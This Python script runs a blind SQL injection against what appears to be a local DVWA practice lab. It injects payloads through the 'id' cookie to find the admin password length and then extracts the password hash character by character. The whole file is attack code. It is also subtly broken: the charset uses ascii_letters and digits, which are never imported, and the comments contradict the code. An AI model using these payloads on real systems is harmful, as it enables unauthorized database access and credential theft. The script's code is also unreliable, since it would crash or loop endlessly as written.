from requests import session
from termcolor import cprint
from string import hexdigits

url = "http://127.0.0.1:42001/vulnerabilities/sqli_blind/" 
s = session()
cookies={
         "language": "en", 
         "cookieconsent_status": "dismiss",
         "security": "high",
         "PHPSESSID": "5jnthhee71t1bbucgn0hvhsqjo",
         "id": "1" #id is vuln to sqli
         }
#the id param is vuln to sqli blind . let exploi it to get admin password 

#get the length of password
password_len = 0
password = ''
charset = ascii_letters + digits
max_len = 100
valid_answer = "User ID exists in the database."

for i in range(max_len, 0, -1):
    payload = f"1' AND length(password) = {i}#"
    cookies['id'] = payload
    response = s.get(url, cookies=cookies)
    if valid_answer in response.text:
        cprint(f"admin password length fund: {i}", "green")
        password_len = i
        break

if password_len == 0:
    cprint("something run wrong. we havn't fund admin password length", 'red')
    exit()

#now that we are suppose to have admin password length, we can bruteforce it char by char
#the password is store in it hash format so we only need to bruteforce
#hexdigits
index = 1
while index <= password_len:
    for l in charset: 
        payload = f"1' AND SUBSTRING(password, {index}, 1) = char( {ord(l)})#"

        cookies['id'] = payload
        response = s.get(url, cookies=cookies)
        if valid_answer in response.text:
            password += l
            cprint(f"char {index} fund", "green")
            cprint(f"password = {password}...")
            index += 1

if len(password) == password_len:
    cprint(f"\nadmin password : {password}", 'green')
else:
    cprint(f"something run wrong: password = {password}", 'red')


